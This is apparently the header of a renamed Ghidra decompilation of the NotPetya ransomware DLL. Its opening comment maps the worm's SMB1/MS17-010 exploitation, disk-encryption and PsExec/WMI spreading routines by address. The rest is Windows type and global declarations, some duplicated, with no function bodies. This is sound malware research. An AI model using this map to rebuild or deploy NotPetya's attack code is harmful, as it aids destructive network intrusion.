/*
 * NOTPETYA — SEMANTICALLY RENAMED GHIDRA C FOR STATIC READING
 * ==========================================================
 * Research target: NotPetya.dll, 362,360 bytes
 * SHA-256: 027cc450ef5f8c5f653329641ec1fed91f694e0d229928963b30f6b0d7d3a745
 * PE image base 0x10000000, PE entry point 0x10007D39, export ordinal #1 at 0x10007DEB.
 *
 * GOAL: Make the supplied Ghidra decompilation navigable. All 170 original
 * function identities were renamed in-place; selected function-specific
 * parameter names were replaced only when evidence justified the meaning.
 * Data flow, calls, literals and control-flow structures are inherited from
 * the user-provided decompilation; they are not newly created exploit code.
 * Compiler validity is not a design target, and these recovered types and
 * implicit register variables are still imperfect Ghidra artifacts.
 *
 * SMB1 / MS17-010 READING PATH (Ghidra virtual addresses)
 * 0x100096C7  TryMs17010ExploitAgainstRemoteHost
 *       |
 * 0x1000668A  Smb1RunTwoPhaseExploitAttempt
 *       |
 * 0x10005A7E  Smb1Ms17010MultiStageAttempt
 *       +-- 0x10006727  OpenTcpConnectionToSmbTarget
 *       +-- 0x10002466  Smb1BuildProtocolHeader (0xFFSMB)
 *       +-- 0x10002547  Smb1BuildNtTransactRequest (SMB cmd 0xA0)
 *       +-- 0x10002620  Smb1BuildEchoRequest (SMB cmd 0x2B)
 *       +-- 0x100020EA  DecodeAndAdaptEmbeddedSmbPayload
 *       +-- 0x100067AF  Smb1SendFramedNetworkPacket
 *       +-- 0x1000688F  Smb1ReceiveNetworkReply
 *
 * Attribution caution: NotPetya's campaign used multiple SMB/MS17-010-era
 * techniques (EternalBlue and EternalRomance). The packet-building and payload
 * stages here prove an SMB1 exploitation subsystem, but do not, by their
 * presence alone, establish a one-to-one mapping of each function to one
 * named exploit. Labels are reading aids, with confidence in the CSV.
 *
 * OTHER READING PATHS
 *   Disk boot stage: 0x10007DEB -> 0x10008D5A -> 0x100014A9 / 0x10008CBF
 *   File encryption:  0x10001EEF -> 0x10001E51 -> 0x10001973 -> 0x1000189A
 *   Remote execution: 0x10009987 -> 0x100097A5 (PsExec) / 0x100098AB (WMI)
 *
 * CAUTION: This contains renamed material derived from destructive malware.
 * It is not tested source, not the historical authors' C, and not for building.
 */

typedef unsigned char   undefined;

typedef unsigned char    bool;
typedef unsigned char    byte;
typedef unsigned int    dword;
typedef unsigned long long    GUID;
typedef pointer32 ImageBaseOffset32;

typedef unsigned char    uchar;
typedef unsigned int    uint;
typedef unsigned long    ulong;
typedef unsigned char    undefined1;
typedef unsigned short    undefined2;
typedef unsigned int    undefined4;
typedef unsigned short    ushort;
typedef unsigned short    wchar16;
typedef short    wchar_t;
typedef unsigned short    word;
typedef struct CLIENT_ID CLIENT_ID, *PCLIENT_ID;

struct CLIENT_ID {
    void *UniqueProcess;
    void *UniqueThread;
};

typedef union IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryUnion IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryUnion, *PIMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryUnion;

typedef struct IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryStruct IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryStruct, *PIMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryStruct;

struct IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryStruct {
    dword OffsetToDirectory:31;
    dword DataIsDirectory:1;
};

union IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryUnion {
    dword OffsetToData;
    struct IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryStruct IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryStruct;
};


// WARNING! conflicting data type names: /guiddef.h/GUID - /GUID

typedef GUID IID;

typedef struct _GUID _GUID, *P_GUID;

struct _GUID {
    ulong Data1;
    ushort Data2;
    ushort Data3;
    uchar Data4[8];
};

typedef ulong DWORD;

typedef DWORD DHCP_IP_MASK;

typedef struct _DHCP_IP_ARRAY _DHCP_IP_ARRAY, *P_DHCP_IP_ARRAY;

typedef struct _DHCP_IP_ARRAY *LPDHCP_IP_ARRAY;

typedef DWORD *LPDHCP_IP_ADDRESS;

struct _DHCP_IP_ARRAY {
    DWORD NumElements;
    LPDHCP_IP_ADDRESS Elements;
};

typedef struct _DHCP_BINARY_DATA _DHCP_BINARY_DATA, *P_DHCP_BINARY_DATA;

typedef struct _DHCP_BINARY_DATA DHCP_BINARY_DATA;

typedef DHCP_BINARY_DATA DHCP_CLIENT_UID;

typedef uchar BYTE;

struct _DHCP_BINARY_DATA {
    DWORD DataLength;
    BYTE *Data;
};

typedef struct _DHCP_CLIENT_INFO_ARRAY _DHCP_CLIENT_INFO_ARRAY, *P_DHCP_CLIENT_INFO_ARRAY;

typedef struct _DHCP_CLIENT_INFO_ARRAY *LPDHCP_CLIENT_INFO_ARRAY;

typedef struct _DHCP_CLIENT_INFO _DHCP_CLIENT_INFO, *P_DHCP_CLIENT_INFO;

typedef struct _DHCP_CLIENT_INFO *LPDHCP_CLIENT_INFO;

typedef DWORD DHCP_IP_ADDRESS;

typedef wchar_t WCHAR;

typedef WCHAR *LPWSTR;

typedef struct _DATE_TIME _DATE_TIME, *P_DATE_TIME;

typedef struct _DATE_TIME DATE_TIME;

typedef struct _DHCP_HOST_INFO _DHCP_HOST_INFO, *P_DHCP_HOST_INFO;

typedef struct _DHCP_HOST_INFO DHCP_HOST_INFO;

struct _DHCP_CLIENT_INFO_ARRAY {
    DWORD NumElements;
    LPDHCP_CLIENT_INFO *Clients;
};

struct _DHCP_CLIENT_INFO {
    DHCP_IP_ADDRESS ClientIpAddress;
    DHCP_IP_MASK SubnetMask;
    DHCP_CLIENT_UID ClientHardwareAddress;
    LPWSTR ClientName;
    LPWSTR ClientComment;
    DATE_TIME ClientLeaseExpires;
    DHCP_HOST_INFO OwnerHost;
};

struct _DATE_TIME {
    DWORD dwLowDateTime;
    DWORD dwHighDateTime;
};

struct _DHCP_HOST_INFO {
    DHCP_IP_ADDRESS IpAddress;
    LPWSTR NetBiosName;
    LPWSTR HostName;
};

typedef struct _DHCP_SUBNET_INFO _DHCP_SUBNET_INFO, *P_DHCP_SUBNET_INFO;

typedef struct _DHCP_SUBNET_INFO *LPDHCP_SUBNET_INFO;

typedef enum _DHCP_SUBNET_STATE {
    DhcpSubnetEnabled=0,
    DhcpSubnetDisabled=1,
    DhcpSubnetEnabledSwitched=2,
    DhcpSubnetDisabledSwitched=3,
    DhcpSubnetInvalidState=4
} _DHCP_SUBNET_STATE;

typedef enum _DHCP_SUBNET_STATE DHCP_SUBNET_STATE;

struct _DHCP_SUBNET_INFO {
    DHCP_IP_ADDRESS SubnetAddress;
    DHCP_IP_MASK SubnetMask;
    LPWSTR SubnetName;
    LPWSTR SubnetComment;
    DHCP_HOST_INFO PrimaryHost;
    DHCP_SUBNET_STATE SubnetState;
};

typedef DWORD DHCP_RESUME_HANDLE;

typedef struct _OVERLAPPED _OVERLAPPED, *P_OVERLAPPED;

typedef ulong ULONG_PTR;

typedef union _union_518 _union_518, *P_union_518;

typedef void *HANDLE;

typedef struct _struct_519 _struct_519, *P_struct_519;

typedef void *PVOID;

struct _struct_519 {
    DWORD Offset;
    DWORD OffsetHigh;
};

union _union_518 {
    struct _struct_519 s;
    PVOID Pointer;
};

struct _OVERLAPPED {
    ULONG_PTR Internal;
    ULONG_PTR InternalHigh;
    union _union_518 u;
    HANDLE hEvent;
};

typedef struct _SECURITY_ATTRIBUTES _SECURITY_ATTRIBUTES, *P_SECURITY_ATTRIBUTES;

typedef void *LPVOID;

typedef int BOOL;

struct _SECURITY_ATTRIBUTES {
    DWORD nLength;
    LPVOID lpSecurityDescriptor;
    BOOL bInheritHandle;
};

typedef struct _STARTUPINFOW _STARTUPINFOW, *P_STARTUPINFOW;

typedef ushort WORD;

typedef BYTE *LPBYTE;

struct _STARTUPINFOW {
    DWORD cb;
    LPWSTR lpReserved;
    LPWSTR lpDesktop;
    LPWSTR lpTitle;
    DWORD dwX;
    DWORD dwY;
    DWORD dwXSize;
    DWORD dwYSize;
    DWORD dwXCountChars;
    DWORD dwYCountChars;
    DWORD dwFillAttribute;
    DWORD dwFlags;
    WORD wShowWindow;
    WORD cbReserved2;
    LPBYTE lpReserved2;
    HANDLE hStdInput;
    HANDLE hStdOutput;
    HANDLE hStdError;
};

typedef struct _SYSTEMTIME _SYSTEMTIME, *P_SYSTEMTIME;

struct _SYSTEMTIME {
    WORD wYear;
    WORD wMonth;
    WORD wDayOfWeek;
    WORD wDay;
    WORD wHour;
    WORD wMinute;
    WORD wSecond;
    WORD wMilliseconds;
};

typedef struct _STARTUPINFOW *LPSTARTUPINFOW;

typedef struct _WIN32_FIND_DATAW _WIN32_FIND_DATAW, *P_WIN32_FIND_DATAW;

typedef struct _WIN32_FIND_DATAW *LPWIN32_FIND_DATAW;

typedef struct _FILETIME _FILETIME, *P_FILETIME;

typedef struct _FILETIME FILETIME;

struct _WIN32_FIND_DATAW {
    DWORD dwFileAttributes;
    FILETIME ftCreationTime;
    FILETIME ftLastAccessTime;
    FILETIME ftLastWriteTime;
    DWORD nFileSizeHigh;
    DWORD nFileSizeLow;
    DWORD dwReserved0;
    DWORD dwReserved1;
    WCHAR cFileName[260];
    WCHAR cAlternateFileName[14];
};

struct _FILETIME {
    DWORD dwLowDateTime;
    DWORD dwHighDateTime;
};

typedef enum _COMPUTER_NAME_FORMAT {
    ComputerNameNetBIOS=0,
    ComputerNameDnsHostname=1,
    ComputerNameDnsDomain=2,
    ComputerNameDnsFullyQualified=3,
    ComputerNamePhysicalNetBIOS=4,
    ComputerNamePhysicalDnsHostname=5,
    ComputerNamePhysicalDnsDomain=6,
    ComputerNamePhysicalDnsFullyQualified=7,
    ComputerNameMax=8
} _COMPUTER_NAME_FORMAT;

typedef struct _OVERLAPPED *LPOVERLAPPED;

typedef DWORD (*PTHREAD_START_ROUTINE)(LPVOID);

typedef PTHREAD_START_ROUTINE LPTHREAD_START_ROUTINE;

typedef struct _SECURITY_ATTRIBUTES *LPSECURITY_ATTRIBUTES;

typedef struct _PROCESS_INFORMATION _PROCESS_INFORMATION, *P_PROCESS_INFORMATION;

struct _PROCESS_INFORMATION {
    HANDLE hProcess;
    HANDLE hThread;
    DWORD dwProcessId;
    DWORD dwThreadId;
};

typedef struct _PROCESS_INFORMATION *LPPROCESS_INFORMATION;

typedef struct _RTL_CRITICAL_SECTION _RTL_CRITICAL_SECTION, *P_RTL_CRITICAL_SECTION;

typedef struct _RTL_CRITICAL_SECTION *PRTL_CRITICAL_SECTION;

typedef PRTL_CRITICAL_SECTION LPCRITICAL_SECTION;

typedef struct _RTL_CRITICAL_SECTION_DEBUG _RTL_CRITICAL_SECTION_DEBUG, *P_RTL_CRITICAL_SECTION_DEBUG;

typedef struct _RTL_CRITICAL_SECTION_DEBUG *PRTL_CRITICAL_SECTION_DEBUG;

typedef long LONG;

typedef struct _LIST_ENTRY _LIST_ENTRY, *P_LIST_ENTRY;

typedef struct _LIST_ENTRY LIST_ENTRY;

struct _RTL_CRITICAL_SECTION {
    PRTL_CRITICAL_SECTION_DEBUG DebugInfo;
    LONG LockCount;
    LONG RecursionCount;
    HANDLE OwningThread;
    HANDLE LockSemaphore;
    ULONG_PTR SpinCount;
};

struct _RTL_CRITICAL_SECTION_DEBUG {
    WORD Type;
    WORD CreatorBackTraceIndex;
    struct _RTL_CRITICAL_SECTION *CriticalSection;
    LIST_ENTRY ProcessLocksList;
    DWORD EntryCount;
    DWORD ContentionCount;
    DWORD Flags;
    WORD CreatorBackTraceIndexHigh;
    WORD SpareWORD;
};

struct _LIST_ENTRY {
    struct _LIST_ENTRY *Flink;
    struct _LIST_ENTRY *Blink;
};

typedef enum _COMPUTER_NAME_FORMAT COMPUTER_NAME_FORMAT;

typedef struct _SYSTEMTIME *LPSYSTEMTIME;

typedef PVOID PSECURITY_DESCRIPTOR;

typedef struct _ACL _ACL, *P_ACL;

struct _ACL {
    BYTE AclRevision;
    BYTE Sbz1;
    WORD AclSize;
    WORD AceCount;
    WORD Sbz2;
};

typedef char CHAR;

typedef enum _SECURITY_IMPERSONATION_LEVEL {
    SecurityAnonymous=0,
    SecurityIdentification=1,
    SecurityImpersonation=2,
    SecurityDelegation=3
} _SECURITY_IMPERSONATION_LEVEL;

typedef union _LARGE_INTEGER _LARGE_INTEGER, *P_LARGE_INTEGER;

typedef struct _struct_19 _struct_19, *P_struct_19;

typedef struct _struct_20 _struct_20, *P_struct_20;

typedef double LONGLONG;

struct _struct_19 {
    DWORD LowPart;
    LONG HighPart;
};

struct _struct_20 {
    DWORD LowPart;
    LONG HighPart;
};

union _LARGE_INTEGER {
    struct _struct_19 s;
    struct _struct_20 u;
    LONGLONG QuadPart;
};

typedef union _LARGE_INTEGER LARGE_INTEGER;

typedef struct _TOKEN_PRIVILEGES _TOKEN_PRIVILEGES, *P_TOKEN_PRIVILEGES;

typedef struct _LUID_AND_ATTRIBUTES _LUID_AND_ATTRIBUTES, *P_LUID_AND_ATTRIBUTES;

typedef struct _LUID_AND_ATTRIBUTES LUID_AND_ATTRIBUTES;

typedef struct _LUID _LUID, *P_LUID;

typedef struct _LUID LUID;

struct _TOKEN_PRIVILEGES {
    DWORD PrivilegeCount;
    LUID_AND_ATTRIBUTES Privileges[1];
};

struct _LUID_AND_ATTRIBUTES {
    LUID Luid;
    DWORD Attributes;
};

struct _LUID {
    DWORD LowPart;
    LONG HighPart;
};

typedef WCHAR *LPCWSTR;

typedef struct _LUID *PLUID;

typedef struct _ACL ACL;

typedef ACL *PACL;

typedef struct _OSVERSIONINFOW _OSVERSIONINFOW, *P_OSVERSIONINFOW;

typedef struct _OSVERSIONINFOW *LPOSVERSIONINFOW;

struct _OSVERSIONINFOW {
    DWORD dwOSVersionInfoSize;
    DWORD dwMajorVersion;
    DWORD dwMinorVersion;
    DWORD dwBuildNumber;
    DWORD dwPlatformId;
    WCHAR szCSDVersion[128];
};

typedef long HRESULT;

typedef CHAR *LPCSTR;

typedef enum _SECURITY_IMPERSONATION_LEVEL SECURITY_IMPERSONATION_LEVEL;

typedef LONG *PLONG;

typedef enum _TOKEN_INFORMATION_CLASS {
    TokenUser=1,
    TokenGroups=2,
    TokenPrivileges=3,
    TokenOwner=4,
    TokenPrimaryGroup=5,
    TokenDefaultDacl=6,
    TokenSource=7,
    TokenType=8,
    TokenImpersonationLevel=9,
    TokenStatistics=10,
    TokenRestrictedSids=11,
    TokenSessionId=12,
    TokenGroupsAndPrivileges=13,
    TokenSessionReference=14,
    TokenSandBoxInert=15,
    TokenAuditPolicy=16,
    TokenOrigin=17,
    TokenElevationType=18,
    TokenLinkedToken=19,
    TokenElevation=20,
    TokenHasRestrictions=21,
    TokenAccessInformation=22,
    TokenVirtualizationAllowed=23,
    TokenVirtualizationEnabled=24,
    TokenIntegrityLevel=25,
    TokenUIAccess=26,
    TokenMandatoryPolicy=27,
    TokenLogonSid=28,
    MaxTokenInfoClass=29
} _TOKEN_INFORMATION_CLASS;

typedef LARGE_INTEGER *PLARGE_INTEGER;

typedef enum _TOKEN_TYPE {
    TokenPrimary=1,
    TokenImpersonation=2
} _TOKEN_TYPE;

typedef enum _TOKEN_TYPE TOKEN_TYPE;

typedef CHAR *LPSTR;

typedef struct _TOKEN_PRIVILEGES *PTOKEN_PRIVILEGES;

typedef PVOID PSID;

typedef HANDLE *PHANDLE;

typedef enum _TOKEN_INFORMATION_CLASS TOKEN_INFORMATION_CLASS;

typedef struct IMAGE_DOS_HEADER IMAGE_DOS_HEADER, *PIMAGE_DOS_HEADER;

struct IMAGE_DOS_HEADER {
    char e_magic[2]; // Magic number
    word e_cblp; // Bytes of last page
    word e_cp; // Pages in file
    word e_crlc; // Relocations
    word e_cparhdr; // Size of header in paragraphs
    word e_minalloc; // Minimum extra paragraphs needed
    word e_maxalloc; // Maximum extra paragraphs needed
    word e_ss; // Initial (relative) SS value
    word e_sp; // Initial SP value
    word e_csum; // Checksum
    word e_ip; // Initial IP value
    word e_cs; // Initial (relative) CS value
    word e_lfarlc; // File address of relocation table
    word e_ovno; // Overlay number
    word e_res[4][4]; // Reserved words
    word e_oemid; // OEM identifier (for e_oeminfo)
    word e_oeminfo; // OEM information; e_oemid specific
    word e_res2[10][10]; // Reserved words
    dword e_lfanew; // File address of new exe header
    byte e_program[64]; // Actual DOS program
};

typedef ULONG_PTR HCRYPTKEY;

typedef ULONG_PTR HCRYPTHASH;

typedef uint ALG_ID;

typedef void (*PFN_CRYPT_FREE)(LPVOID);

typedef struct _CRYPT_DECODE_PARA _CRYPT_DECODE_PARA, *P_CRYPT_DECODE_PARA;

typedef uint size_t;

typedef LPVOID (*PFN_CRYPT_ALLOC)(size_t);

struct _CRYPT_DECODE_PARA {
    DWORD cbSize;
    PFN_CRYPT_ALLOC pfnAlloc;
    PFN_CRYPT_FREE pfnFree;
};

typedef ULONG_PTR HCRYPTPROV;

typedef struct _CRYPT_DECODE_PARA *PCRYPT_DECODE_PARA;

typedef ULONG_PTR SIZE_T;

typedef WCHAR OLECHAR;

typedef OLECHAR *LPOLESTR;

typedef int (*FARPROC)(void);

typedef uchar UCHAR;

typedef UCHAR *PUCHAR;

typedef HANDLE *LPHANDLE;

typedef DWORD *LPDWORD;

typedef struct HINSTANCE__ HINSTANCE__, *PHINSTANCE__;

struct HINSTANCE__ {
    int unused;
};

typedef DWORD *PDWORD;

typedef HANDLE HGLOBAL;

typedef BOOL *LPBOOL;

typedef void *LPCVOID;

typedef struct HINSTANCE__ *HINSTANCE;

typedef struct HRSRC__ HRSRC__, *PHRSRC__;

typedef struct HRSRC__ *HRSRC;

struct HRSRC__ {
    int unused;
};

typedef HINSTANCE HMODULE;

typedef HANDLE HLOCAL;

typedef uint UINT;

typedef struct IMAGE_RESOURCE_DIRECTORY_ENTRY IMAGE_RESOURCE_DIRECTORY_ENTRY, *PIMAGE_RESOURCE_DIRECTORY_ENTRY;

typedef union IMAGE_RESOURCE_DIRECTORY_ENTRY_NameUnion IMAGE_RESOURCE_DIRECTORY_ENTRY_NameUnion, *PIMAGE_RESOURCE_DIRECTORY_ENTRY_NameUnion;

typedef struct IMAGE_RESOURCE_DIRECTORY_ENTRY_NameStruct IMAGE_RESOURCE_DIRECTORY_ENTRY_NameStruct, *PIMAGE_RESOURCE_DIRECTORY_ENTRY_NameStruct;

union IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryUnion {
    dword OffsetToData;
    struct IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryStruct IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryStruct;
};

struct IMAGE_RESOURCE_DIRECTORY_ENTRY_NameStruct {
    dword NameOffset:31;
    dword NameIsString:1;
};

union IMAGE_RESOURCE_DIRECTORY_ENTRY_NameUnion {
    struct IMAGE_RESOURCE_DIRECTORY_ENTRY_NameStruct IMAGE_RESOURCE_DIRECTORY_ENTRY_NameStruct;
    dword Name;
    word Id;
};

struct IMAGE_RESOURCE_DIRECTORY_ENTRY {
    union IMAGE_RESOURCE_DIRECTORY_ENTRY_NameUnion NameUnion;
    union IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryUnion DirectoryUnion;
};

typedef struct IMAGE_OPTIONAL_HEADER32 IMAGE_OPTIONAL_HEADER32, *PIMAGE_OPTIONAL_HEADER32;

typedef struct IMAGE_DATA_DIRECTORY IMAGE_DATA_DIRECTORY, *PIMAGE_DATA_DIRECTORY;

struct IMAGE_OPTIONAL_HEADER32 {
    word Magic;
    byte MajorLinkerVersion;
    byte MinorLinkerVersion;
    dword SizeOfCode;
    dword SizeOfInitializedData;
    dword SizeOfUninitializedData;
    ImageBaseOffset32 AddressOfEntryPoint;
    ImageBaseOffset32 BaseOfCode;
    ImageBaseOffset32 BaseOfData;
    pointer32 ImageBase;
    dword SectionAlignment;
    dword FileAlignment;
    word MajorOperatingSystemVersion;
    word MinorOperatingSystemVersion;
    word MajorImageVersion;
    word MinorImageVersion;
    word MajorSubsystemVersion;
    word MinorSubsystemVersion;
    dword Win32VersionValue;
    dword SizeOfImage;
    dword SizeOfHeaders;
    dword CheckSum;
    word Subsystem;
    word DllCharacteristics;
    dword SizeOfStackReserve;
    dword SizeOfStackCommit;
    dword SizeOfHeapReserve;
    dword SizeOfHeapCommit;
    dword LoaderFlags;
    dword NumberOfRvaAndSizes;
    struct IMAGE_DATA_DIRECTORY DataDirectory[16];
};

struct IMAGE_DATA_DIRECTORY {
    ImageBaseOffset32 VirtualAddress;
    dword Size;
};

typedef struct IMAGE_SECTION_HEADER IMAGE_SECTION_HEADER, *PIMAGE_SECTION_HEADER;

typedef union Misc Misc, *PMisc;

typedef enum SectionFlags {
    IMAGE_SCN_TYPE_NO_PAD=8,
    IMAGE_SCN_RESERVED_0001=16,
    IMAGE_SCN_CNT_CODE=32,
    IMAGE_SCN_CNT_INITIALIZED_DATA=64,
    IMAGE_SCN_CNT_UNINITIALIZED_DATA=128,
    IMAGE_SCN_LNK_OTHER=256,
    IMAGE_SCN_LNK_INFO=512,
    IMAGE_SCN_RESERVED_0040=1024,
    IMAGE_SCN_LNK_REMOVE=2048,
    IMAGE_SCN_LNK_COMDAT=4096,
    IMAGE_SCN_GPREL=32768,
    IMAGE_SCN_MEM_16BIT=131072,
    IMAGE_SCN_MEM_PURGEABLE=131072,
    IMAGE_SCN_MEM_LOCKED=262144,
    IMAGE_SCN_MEM_PRELOAD=524288,
    IMAGE_SCN_ALIGN_1BYTES=1048576,
    IMAGE_SCN_ALIGN_2BYTES=2097152,
    IMAGE_SCN_ALIGN_4BYTES=3145728,
    IMAGE_SCN_ALIGN_8BYTES=4194304,
    IMAGE_SCN_ALIGN_16BYTES=5242880,
    IMAGE_SCN_ALIGN_32BYTES=6291456,
    IMAGE_SCN_ALIGN_64BYTES=7340032,
    IMAGE_SCN_ALIGN_128BYTES=8388608,
    IMAGE_SCN_ALIGN_256BYTES=9437184,
    IMAGE_SCN_ALIGN_512BYTES=10485760,
    IMAGE_SCN_ALIGN_1024BYTES=11534336,
    IMAGE_SCN_ALIGN_2048BYTES=12582912,
    IMAGE_SCN_ALIGN_4096BYTES=13631488,
    IMAGE_SCN_ALIGN_8192BYTES=14680064,
    IMAGE_SCN_LNK_NRELOC_OVFL=16777216,
    IMAGE_SCN_MEM_DISCARDABLE=33554432,
    IMAGE_SCN_MEM_NOT_CACHED=67108864,
    IMAGE_SCN_MEM_NOT_PAGED=134217728,
    IMAGE_SCN_MEM_SHARED=268435456,
    IMAGE_SCN_MEM_EXECUTE=536870912,
    IMAGE_SCN_MEM_READ=1073741824,
    IMAGE_SCN_MEM_WRITE=2147483648
} SectionFlags;

union Misc {
    dword PhysicalAddress;
    dword VirtualSize;
};

struct IMAGE_SECTION_HEADER {
    char Name[8];
    union Misc Misc;
    ImageBaseOffset32 VirtualAddress;
    dword SizeOfRawData;
    dword PointerToRawData;
    dword PointerToRelocations;
    dword PointerToLinenumbers;
    word NumberOfRelocations;
    word NumberOfLinenumbers;
    enum SectionFlags Characteristics;
};

typedef struct IMAGE_BASE_RELOCATION IMAGE_BASE_RELOCATION, *PIMAGE_BASE_RELOCATION;

struct IMAGE_BASE_RELOCATION {
    dword VirtualAddress;
    dword SizeOfBlock;
};

typedef struct IMAGE_RESOURCE_DATA_ENTRY IMAGE_RESOURCE_DATA_ENTRY, *PIMAGE_RESOURCE_DATA_ENTRY;

struct IMAGE_RESOURCE_DATA_ENTRY {
    dword OffsetToData;
    dword Size;
    dword CodePage;
    dword Reserved;
};

typedef struct IMAGE_RESOURCE_DIRECTORY IMAGE_RESOURCE_DIRECTORY, *PIMAGE_RESOURCE_DIRECTORY;

struct IMAGE_RESOURCE_DIRECTORY {
    dword Characteristics;
    dword TimeDateStamp;
    word MajorVersion;
    word MinorVersion;
    word NumberOfNamedEntries;
    word NumberOfIdEntries;
};

typedef struct IMAGE_DIRECTORY_ENTRY_EXPORT IMAGE_DIRECTORY_ENTRY_EXPORT, *PIMAGE_DIRECTORY_ENTRY_EXPORT;

struct IMAGE_DIRECTORY_ENTRY_EXPORT {
    dword Characteristics;
    dword TimeDateStamp;
    word MajorVersion;
    word MinorVersion;
    ImageBaseOffset32 Name;
    dword Base;
    dword NumberOfFunctions;
    dword NumberOfNames;
    ImageBaseOffset32 AddressOfFunctions;
    ImageBaseOffset32 AddressOfNames;
    ImageBaseOffset32 AddressOfNameOrdinals;
};

typedef struct IMAGE_FILE_HEADER IMAGE_FILE_HEADER, *PIMAGE_FILE_HEADER;

struct IMAGE_FILE_HEADER {
    word Machine; // 332
    word NumberOfSections;
    dword TimeDateStamp;
    dword PointerToSymbolTable;
    dword NumberOfSymbols;
    word SizeOfOptionalHeader;
    word Characteristics;
};

typedef struct IMAGE_NT_HEADERS32 IMAGE_NT_HEADERS32, *PIMAGE_NT_HEADERS32;

struct IMAGE_FILE_HEADER {
    word Machine; // 332
    word NumberOfSections;
    dword TimeDateStamp;
    dword PointerToSymbolTable;
    dword NumberOfSymbols;
    word SizeOfOptionalHeader;
    word Characteristics;
};

struct IMAGE_OPTIONAL_HEADER32 {
    word Magic;
    byte MajorLinkerVersion;
    byte MinorLinkerVersion;
    dword SizeOfCode;
    dword SizeOfInitializedData;
    dword SizeOfUninitializedData;
    ImageBaseOffset32 AddressOfEntryPoint;
    ImageBaseOffset32 BaseOfCode;
    ImageBaseOffset32 BaseOfData;
    pointer32 ImageBase;
    dword SectionAlignment;
    dword FileAlignment;
    word MajorOperatingSystemVersion;
    word MinorOperatingSystemVersion;
    word MajorImageVersion;
    word MinorImageVersion;
    word MajorSubsystemVersion;
    word MinorSubsystemVersion;
    dword Win32VersionValue;
    dword SizeOfImage;
    dword SizeOfHeaders;
    dword CheckSum;
    word Subsystem;
    word DllCharacteristics;
    dword SizeOfStackReserve;
    dword SizeOfStackCommit;
    dword SizeOfHeapReserve;
    dword SizeOfHeapCommit;
    dword LoaderFlags;
    dword NumberOfRvaAndSizes;
    struct IMAGE_DATA_DIRECTORY DataDirectory[16];
};

struct IMAGE_NT_HEADERS32 {
    char Signature[4];
    struct IMAGE_FILE_HEADER FileHeader;
    struct IMAGE_OPTIONAL_HEADER32 OptionalHeader;
};

typedef struct _NETRESOURCEW _NETRESOURCEW, *P_NETRESOURCEW;

struct _NETRESOURCEW {
    DWORD dwScope;
    DWORD dwType;
    DWORD dwDisplayType;
    DWORD dwUsage;
    LPWSTR lpLocalName;
    LPWSTR lpRemoteName;
    LPWSTR lpComment;
    LPWSTR lpProvider;
};

typedef struct _NETRESOURCEW *LPNETRESOURCEW;



DWORD DAT_1001f8f8;
undefined *PTR_FUN_1001b104;
undefined4 DAT_10018c50;
undefined DAT_10018e50;
undefined FileCryptoWorker_10001E51;
int DAT_1001fb48;
char g_smb_payload_variant;
HMODULE DAT_1001f120;
undefined UNK_10010bb8;
undefined4 DAT_10016014;
undefined4 DAT_10016018;
undefined2 DAT_1001601c;
byte DAT_1001601e;
undefined DAT_10018ad0;
undefined DAT_10018b48;
string s_u)u)uDuGuFu[uDuGu[uFuDu[uGu)u<u%_10018b94;
undefined1 DAT_10018bd8;
undefined1 DAT_10018b34;
undefined DAT_10018bc4;
undefined1 DAT_10010b08;
undefined1 DAT_100123b0;
undefined DAT_10012d27;
undefined DAT_ffdff1f0;
void *WOW32Reserved;
int DAT_1001fad0;
int DAT_1001fad4;
int DAT_1001fad8;
int DAT_1001fadc;
undefined2 DAT_1001fb44;
int DAT_1001fae8;
uint DAT_1001fb38;
undefined2 DAT_1001fb2c;
int DAT_1001faec;
char *DAT_1001fb08;
short DAT_1001fb28;
undefined DAT_1001fb10;
undefined DAT_1001fb24;
undefined DAT_1001fb0c;
undefined DAT_1001fb14;
undefined4 DAT_1001fb18;
short DAT_1001fb1c;
short DAT_1001fb20;
short DAT_1001fb30;
short DAT_1001fb34;
ushort UNK_1001fb1e;
int DAT_1001fb18;
int DAT_1001fb08;
int DAT_1001faf0;
int DAT_1001faf4;
int DAT_1001fb24;
uint DAT_1001fad0;
int DAT_1001fb40;
ushort DAT_1001fb20;
ushort DAT_1001fb34;
int DAT_1001fb3c;
ushort DAT_1001fb1c;
ushort DAT_1001fb2c;
int DAT_1001fb38;
ushort DAT_1001fb30;
undefined DAT_1001fae0;
undefined DAT_1001fae4;
uint DAT_1001fae8;
undefined4 DAT_1001fadc;
undefined4 DAT_1001fad8;
uint DAT_1001fb00;
int DAT_1001fb04;
int DAT_1001fb14;
ushort DAT_1001fb28;
uint DAT_1001faf8;
uint DAT_1001fafc;
void *DAT_1001faf4;
undefined1 DAT_100131a8;
byte g_smb_attempt_state;
undefined DAT_10016020;
undefined DAT_10017090;
undefined DAT_10017860;
undefined DAT_1001f900;
undefined DAT_1001fb48;
undefined1 g_smb_attempt_state;
undefined ComposeStagedPayloadBuffer_10001F74;
int g_start_tick_count;
uint g_runtime_wait_minutes;
LPCRITICAL_SECTION DAT_1001f140;
int g_runtime_wait_minutes;
undefined2 DAT_1001b110;
undefined4 DAT_10016010;
undefined DAT_1001f0f8;
int DAT_10016010;
undefined DAT_1001f124;
undefined4 DAT_1001f108;
LPCRITICAL_SECTION DAT_1001f108;
undefined NamedPipeReadWorker_100073FD;
undefined2 DAT_100140bc;
undefined DiscoverNetworkInterfaceSubnets_10008E7F;
int DAT_1001f114;
DWORD g_start_tick_count;
uint g_privilege_and_execution_flags;
undefined g_runtime_feature_flags;
undefined2 g_original_dll_path;
int DAT_1001f0fc;
int DAT_1001f11c;
undefined NetworkWorkerScheduler_1000A0FE;
LPCRITICAL_SECTION DAT_1001f110;
undefined DeferredNetworkWorker_1000A274;
byte g_runtime_feature_flags;
ushort g_original_dll_path;
undefined FreeNetworkTargetEntry_10006CAA;
undefined NetworkDiscoveryCoordinator_10007C10;
